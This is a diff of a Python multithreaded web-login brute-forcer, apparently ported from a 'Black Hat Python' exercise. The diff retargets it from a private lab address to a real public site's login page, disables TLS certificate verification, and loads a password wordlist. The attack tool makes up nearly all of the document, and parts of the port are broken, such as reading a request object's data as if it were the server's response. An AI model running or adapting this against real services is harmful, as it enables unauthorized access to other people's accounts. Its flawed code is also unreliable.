@@ -4,19 +4,19 @@ import http.cookiejar
 import threading
 import sys
 import queue as Queue
+import ssl
 
 from html.parser import HTMLParser
-#from HTMLParser import HTMLParser
 
 # 简要设置
 user_thread   = 10
 username      = "admin"
-wordlist_file = "/tmp/cain.txt"
+wordlist_file = "/root/black-hat/chapter5/暴力破解密码字典.txt"
 resume        = None
 
 # 特定目标设置
-target_url    = "http://192.168.112.131/administrator/index.php"
-target_post   = "http://192.168.112.131/administrator/index.php"
+target_url    = "https://passport.csdn.net/login"
+target_post   = "https://passport.csdn.net/login"
 
 username_field= "username"
 password_field= "passwd"
@@ -46,12 +46,11 @@ class BruteParser(HTMLParser):
 
 class Bruter(object):
     def __init__(self, username, words):
-        
         self.username   = username
         self.password_q = words
         self.found      = False
         
-        print ("Finished setting up for: %s" % username)
+        print ("Finished setting up for: {}".format(username))
         
     def run_bruteforce(self):
         
@@ -62,19 +61,21 @@ class Bruter(object):
     def web_bruter(self):
         
         while not self.password_q.empty() and not self.found:
-            brute = self.password_q.get().rstrip()
-            jar = http.cookiejar.FileCookieJar("cookies")
-            opener = urllib.request.build_opener(urllib2.HTTPCookieProcessor(jar))
+            brute = self.password_q.get().rstrip().decode(encoding = 'utf-8')
+            #jar = http.cookiejar.FileCookieJar("cookies")
+            #opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
             
-            response = opener.open(target_url)
-            
+            #response = opener.open(target_url)
+            # 通过导入ssl模块把证书验证改成不用验证 
+            ssl._create_default_https_context = ssl._create_unverified_context
+            response = urllib.request.urlopen(target_url)
             page = response.read()
             
-            print ("Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize()))
+            print ("Trying: {}  : {} ({} left)".format(self.username,brute,self.password_q.qsize()))
 
             # 解析隐藏区域
             parser = BruteParser()
-            parser.feed(page)     
+            parser.feed(page.decode(encoding='utf-8'))     
             
             post_tags = parser.tag_results
             
@@ -82,18 +83,19 @@ class Bruter(object):
             post_tags[username_field] = self.username
             post_tags[password_field] = brute
             
-            login_data = urllib.urlencode(post_tags)
-            login_response = opener.open(target_post, login_data)
-            
-            login_result = login_response.read()
+            #login_data = urllib.urlencode(post_tags)
+            login_response = urllib.request.Request(target_post,data=post_tags)
+            #login_response = opener.open(target_post, login_data)
+            login_result = login_response.data
+            #login_result = login_response.read()
             
             
             if success_check in login_result:
                 self.found = True
                 
                 print ("[*] Bruteforce successful.")
-                print ("[*] Username: %s" % username)
-                print ("[*] Password: %s" % brute)
+                print ("[*] Username: {}".format(username))
+                print ("[*] Password: {}".format(brute))
                 print ("[*] Waiting for other threads to exit...")
 
 def build_wordlist(wordlist_file):
